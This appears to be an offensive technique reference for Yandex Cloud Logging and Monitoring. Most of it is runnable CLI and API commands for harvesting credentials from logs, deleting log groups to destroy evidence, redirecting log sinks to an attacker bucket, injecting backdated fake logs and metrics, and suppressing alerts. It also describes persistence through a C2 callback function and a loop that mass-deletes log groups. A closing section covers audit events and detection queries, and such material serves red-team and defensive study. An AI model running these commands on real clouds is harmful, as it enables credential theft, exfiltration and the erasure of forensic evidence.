# Yandex Cloud - Cloud Logging & Monitoring Techniques

## Service Overview

Yandex Cloud Logging is a centralized log aggregation service. Yandex Monitoring stores time-series metrics and supports alerting with notification channels. Together they form the observability stack — and a high-value target for both reconnaissance and defense evasion.

**Cloud Logging Key Concepts:**
- **Log Groups**: Containers for logs. A **default** group is auto-created per folder; custom groups can be created manually (max 10 per cloud)
- **Log Ingestion**: Via CLI (`yc logging write`), gRPC API, or from integrated services (API Gateway, Cloud Functions, ALB, Audit Trails, Compute, Container Registry, Managed K8s, Serverless Containers)
- **Sinks**: Export destinations — S3 (Object Storage) or YDS (Yandex Data Streams); each sink uses a service account for writes
- **Exports**: Move log data from a log group to a sink
- **Retention Period**: Configurable per log group (min 1 hour, max 31 days)
- **No Individual Deletion**: Cannot delete individual log entries — only the entire log group or wait for retention expiry
- **Timestamps**: Writers can set custom timestamps within -30 days to +1 day of the current time

**Monitoring Key Concepts:**
- **Metrics**: Time-series data identified by labels (`cloudId`, `folderId`, `service`, plus custom labels)
- **Dashboards**: Managed via gRPC DashboardService API
- **Alerts**: Queries evaluated once per minute; status changes to Warn or Alarm when thresholds are hit
- **Notification Channels**: Email, SMS, Telegram, or **Cloud Functions invocation** (security-relevant persistence vector)
- **Escalation Policies**: Sequences of notification steps that loop until stopped (up to 10 iterations)

---

## Enumeration

### Enumerate Log Groups

```bash
# List all log groups in a folder
yc logging group list --folder-id <FOLDER_ID>

# Get details of a specific log group
yc logging group get --name <GROUP_NAME>
yc logging group get --id <GROUP_ID>

# Show consumed resources (size, record count)
yc logging group stats --name <GROUP_NAME>

# List resources writing to a log group
yc logging group list-resources --name <GROUP_NAME>

# List operations performed on a log group
yc logging group list-operations --name <GROUP_NAME>

# List access bindings
yc logging group list-access-bindings --name <GROUP_NAME>
```

### Enumerate Sinks and Exports

```bash
# List sinks (export destinations)
yc logging sink list --folder-id <FOLDER_ID>

# Get sink details (bucket, stream, service account)
yc logging sink get --name <SINK_NAME>

# List sink access bindings
yc logging sink list-access-bindings --name <SINK_NAME>

# List operations on a sink
yc logging sink list-operations --name <SINK_NAME>
```

### Read Log Entries

```bash
# Read logs from the default group (last hour)
yc logging read --group-name=default --folder-id <FOLDER_ID>

# Read with time range
yc logging read --group-name=<NAME> --since "2h ago" --until "1h ago"

# Follow logs in real time
yc logging read --group-name=<NAME> -f

# Filter by level
yc logging read --group-name=<NAME> --levels ERROR,FATAL

# Filter by resource type
yc logging read --group-name=<NAME> --resource-types serverless.function

# Search with filter expressions
yc logging read --group-name=<NAME> --filter "level>=WARN AND message: \"password\""

# Output as JSON for scripting
yc logging read --group-name=default --format json
```

### Enumerate Monitoring Dashboards and Metrics

```bash
# List dashboards (gRPC API)
grpcurl -rpc-header "Authorization: Bearer <IAM_TOKEN>" \
  -d '{"folder_id": "<FOLDER_ID>"}' \
  monitoring.api.cloud.yandex.net:443 \
  yandex.cloud.monitoring.v3.DashboardService.List

# List metric names
curl -H "Authorization: Bearer ${IAM_TOKEN}" \
  "https://monitoring.api.cloud.yandex.net/monitoring/v2/metrics/names?folderId=<FOLDER_ID>"

# List label keys (discover services and resources)
curl -H "Authorization: Bearer ${IAM_TOKEN}" \
  "https://monitoring.api.cloud.yandex.net/monitoring/v2/metrics/labels?folderId=<FOLDER_ID>"

# Read metric data
curl -X POST -H "Authorization: Bearer ${IAM_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"query":"...","fromTime":"...","toTime":"...","downsampling":{"maxPoints":"100"}}' \
  "https://monitoring.api.cloud.yandex.net/monitoring/v2/data/read?folderId=<FOLDER_ID>"
```

---

## Credential Access

### Harvest Credentials from Logs

With `logging.reader`, search logs for secrets, tokens, and credentials leaked by applications or services:

```bash
# Search for common credential patterns
yc logging read --group-name=default --filter "message: \"password\""
yc logging read --group-name=default --filter "message: \"token\""
yc logging read --group-name=default --filter "message: \"secret\""
yc logging read --group-name=default --filter "message: \"api_key\""
yc logging read --group-name=default --filter "message: \"Authorization\""

# Search JSON payloads for structured sensitive data
yc logging read --group-name=default --filter "json_payload: \"credentials\""

# Follow real-time logs for credential harvesting
yc logging read --group-name=default -f --filter "message: \"Bearer\""

# Search errors that may reveal internal paths/configs
yc logging read --group-name=default --levels ERROR,FATAL --format json
```

### Reconnaissance via Monitoring Metrics

With `monitoring.viewer`, read metrics to understand infrastructure patterns and operational rhythms:

```bash
# Enumerate all metric names to discover infrastructure
curl -H "Authorization: Bearer ${IAM_TOKEN}" \
  "https://monitoring.api.cloud.yandex.net/monitoring/v2/metrics/names?folderId=<FOLDER_ID>"

# Enumerate label keys to discover services and resources
curl -H "Authorization: Bearer ${IAM_TOKEN}" \
  "https://monitoring.api.cloud.yandex.net/monitoring/v2/metrics/labels?folderId=<FOLDER_ID>"
```

Cloud Logging exposes its own metrics to Monitoring — an attacker can monitor `group.read_records_per_second` to detect if defenders are actively investigating logs.

---

## Defense Evasion

### Delete Log Groups (Anti-Forensics)

With `logging.editor`, destroy evidence by deleting entire log groups:

```bash
# Delete a log group (destroys all contained logs)
yc logging group delete --name <GROUP_NAME>

# Reduce retention to minimum (1 hour) to accelerate log expiry
yc logging group update --name <GROUP_NAME> --retention-period 1h
```

**Note**: Reducing retention does not guarantee immediate deletion — Yandex states deletion "may occur later." Deleting the entire group is more effective for evidence destruction.

### Disrupt Log Export Pipelines

```bash
# Delete log sinks to stop export to external storage
yc logging sink delete --name <SINK_NAME>

# Redirect sink to attacker-controlled bucket (intercept + destroy)
yc logging sink update --name <SINK_NAME> --s3 bucket=<ATTACKER_BUCKET>

# Redirect sink to attacker-controlled data stream
yc logging sink update --name <SINK_NAME> --yds stream-name=<ATTACKER_STREAM>
```

### Log Injection / Pollution

With `logging.writer`, inject false entries to pollute logs and create cover:

```bash
# Inject a backdated entry mimicking a legitimate service
yc logging write --group-name=default \
  --message "Routine maintenance completed successfully" \
  --resource-type serverless.function \
  --resource-id <FUNCTION_ID> \
  --timestamp "2024-01-15T03:00:00Z" \
  --level INFO

# Flood logs with noise to hide malicious activity
yc logging write --group-name=default \
  --message "Health check passed" --level INFO

# Write with JSON payload for structured log pollution
yc logging write --group-name=<NAME> --message "test" \
  --json-payload '{"status":"ok","source":"monitoring"}'
```

Timestamps can be backdated up to 30 days, enabling fake audit trail creation.

### Suppress Monitoring Alerts

With `monitoring.editor`, suppress alerts to avoid detection during an attack:

- **Delete alerts**: Remove monitoring triggers via console or API
- **Raise alert thresholds**: Set thresholds to extremely high values so they never fire
- **Delete notification channels**: Remove email/Telegram/SMS/function channels to prevent alert delivery
- **Change no-data policy**: Change the "No metrics" policy from "Alarm" to "OK" to suppress alerts when services are stopped
- **Delete dashboards**: Remove operational visibility

```bash
# Delete a dashboard via gRPC
grpcurl -rpc-header "Authorization: Bearer <IAM_TOKEN>" \
  -d '{"dashboard_id": "<DASHBOARD_ID>", "etag": "<ETAG>"}' \
  monitoring.api.cloud.yandex.net:443 \
  yandex.cloud.monitoring.v3.DashboardService.Delete
```

### Inject Fake Metrics

With `monitoring.editor`, write custom metrics to mask real values:

```bash
# Write fake metrics to mask real values
curl -X POST -H "Authorization: Bearer ${IAM_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"metrics":[{"name":"cpu_usage","labels":{"k":"v"},"value":0.05}]}' \
  "https://monitoring.api.cloud.yandex.net/monitoring/v2/data/write?folderId=<FOLDER_ID>&service=custom"
```

---

## Persistence

### Alert-Based Callback via Cloud Functions

An attacker with `monitoring.editor` can create an alert with a Cloud Functions notification channel that invokes an attacker-controlled function whenever a metric condition is met:

1. Create a Cloud Function that phones home to an attacker C2 server
2. Create a service account with `functions.invoker` role
3. Create a notification channel of type "Cloud Functions" pointing to the function
4. Create an alert on a frequently triggered metric (e.g., `cpu_usage > 0`)
5. The function is invoked each time the alert fires (evaluated every minute)

The function receives a JSON payload with `alertId`, `alertName`, `folderId`, `status`, and `annotations` — providing ongoing infrastructure intelligence.

**Escalation policy abuse**: Create escalation policies that repeatedly invoke the function (up to 10 iterations across multiple steps), ensuring persistent callbacks.

### Log-Triggered Function Execution

Cloud Logging triggers can invoke Cloud Functions whenever new log entries appear in a log group. An attacker can create a trigger tied to normal log activity for persistent code execution.

### Attacker-Controlled Log Sink

```bash
# Create a new sink exfiltrating logs to attacker storage
yc logging sink create --name exfil-sink \
  --service-account-id <SA_ID> \
  --s3 bucket=<ATTACKER_BUCKET>,prefix=stolen-logs/
```

This sink continuously exports all new log entries to attacker-controlled storage, surviving even if direct API access is revoked.

---

## Lateral Movement

### Log Data Exfiltration via Sink Redirection

```bash
# Redirect existing sink to attacker-controlled bucket
yc logging sink update --name <SINK_NAME> --s3 bucket=<ATTACKER_BUCKET>

# Change the service account used by the sink
yc logging sink update --name <SINK_NAME> --service-account-id <ATTACKER_SA_ID>
```

### Cross-Service Intelligence from Logs

Log groups aggregate data from multiple services. With `logging.reader`, extract:
- **API Gateway logs**: Request paths, headers, authentication tokens
- **Cloud Functions logs**: Environment variables, function outputs, error details
- **ALB logs**: Backend addresses, routing rules, client IPs
- **Managed K8s logs**: Pod configurations, service accounts, namespace details
- **Audit Trails logs**: Other users' actions, resource IDs, operation details

---

## Post-Exploitation

### Data Destruction via Log Group Deletion

```bash
# Delete all custom log groups in a folder
yc logging group list --folder-id <FOLDER_ID> --format json | \
  jq -r '.[].id' | while read id; do
    yc logging group delete --id "$id"
  done
```

### Complete Observability Blindness

Combine log tampering and alert suppression for full defense evasion:

1. Delete or redirect all log export sinks
2. Reduce retention on all log groups to 1 hour
3. Delete monitoring alerts and notification channels
4. Delete dashboards
5. Proceed with attack operations during the blind window

---

## Network Considerations

- Cloud Logging API endpoint: `logging.api.cloud.yandex.net`
- Monitoring API endpoint: `monitoring.api.cloud.yandex.net`
- Log write rate limit: 1,000 records/second per log group
- Log read rate limit: 5 requests/second
- Max 10 custom log groups per cloud
- Alert evaluation frequency: once per minute

---

## Key IAM Roles

### Cloud Logging

| Role | Capabilities |
|---|---|
| `logging.viewer` | View log groups, sinks, exports, access bindings |
| `logging.reader` | All of `logging.viewer` + **read log entries** |
| `logging.writer` | All of `logging.viewer` + **write log entries** (injection) |
| `logging.editor` | All of `logging.viewer` + create/modify/**delete** log groups, sinks, exports |
| `logging.admin` | All of `logging.editor` + `logging.reader` + `logging.writer` + manage access bindings |

**Key observation**: `logging.editor` can delete log groups but cannot read entries. `logging.reader` can read entries but cannot delete. `logging.admin` can do both.

### Monitoring

| Role | Capabilities |
|---|---|
| `monitoring.viewer` | View metrics, dashboards, alerts, notification history |
| `monitoring.editor` | All of `monitoring.viewer` + create/modify/**delete** dashboards, alerts, notification channels; write custom metrics |
| `monitoring.admin` | All of `monitoring.editor` |

---

## Detection and Logging

### Audit Trail Events

Cloud Logging management events (source: `yandex.cloud.audit.logging`):

| Event | Security Relevance |
|---|---|
| `CreateLogGroup` | New log group creation |
| `UpdateLogGroup` | Retention period changes (anti-forensics indicator) |
| `DeleteLogGroup` | **Log destruction — high-priority alert** |
| `ChangeLogGroupAccessBindings` | Privilege escalation on logging resources |
| `CreateSink` / `UpdateSink` / `DeleteSink` | Export pipeline manipulation |
| `CreateExport` / `UpdateExport` / `DeleteExport` | Export manipulation |
| `Set*AccessBindings` / `Update*AccessBindings` | Permission changes on logging resources |

### Critical Detection Gaps

- **Data plane events are not audited**: `LogIngestionService.Write` (log injection) and `LogReadingService.Read` (log reading) do **not** generate Audit Trail events — an attacker can read all logs or inject entries without audit trace
- **Monitoring has limited audit coverage**: Dashboard and alert management operations may not have dedicated Audit Trail event types (`yandex.cloud.audit.monitoring.*`)

### Detection Queries

**Detect log group deletion (anti-forensics)**:
```
event_type LIKE "%DeleteLogGroup%"
```

**Detect retention reduction**:
```
event_type LIKE "%UpdateLogGroup%" AND details CONTAINS "retention_period"
```

**Detect sink manipulation**:
```
event_type LIKE "%DeleteSink%" OR event_type LIKE "%UpdateSink%"
```

**Detect unusual log read patterns** (via Monitoring metrics):
```
Monitor group.read_records_per_second for anomalous spikes
```

---

## References

- Cloud Logging Documentation: `en/logging/`
- Cloud Logging Security: `en/logging/security/index.md`
- Cloud Logging CLI: `en/logging/cli-ref/`
- Cloud Logging Audit Trail Events: `en/logging/at-ref.md`
- Monitoring Documentation: `en/monitoring/`
- Monitoring Security: `en/monitoring/security/index.md`
- Monitoring Alerting: `en/monitoring/concepts/alerting/alert.md`
- Notification Channels: `en/monitoring/concepts/alerting/notification-channel.md`
- Dashboard API: `en/monitoring/operations/dashboard/api-examples.md`
